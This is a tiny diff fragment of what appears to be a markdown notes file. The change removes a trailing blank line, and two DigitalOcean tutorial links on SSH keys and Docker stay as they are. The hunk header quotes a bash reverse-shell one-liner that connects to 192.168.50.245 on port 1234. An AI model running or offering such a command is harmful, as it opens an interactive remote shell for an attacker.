@@ -388,4 +388,3 @@ bash -c  "bash -i >& /dev/tcp/192.168.50.245/1234 0>&1"
 * https://www.digitalocean.com/community/tutorials/how-to-configure-ssh-key-based-authentication-on-a-linux-server
 * https://www.digitalocean.com/community/tutorials/how-to-install-and-use-docker-on-debian-9
 
-
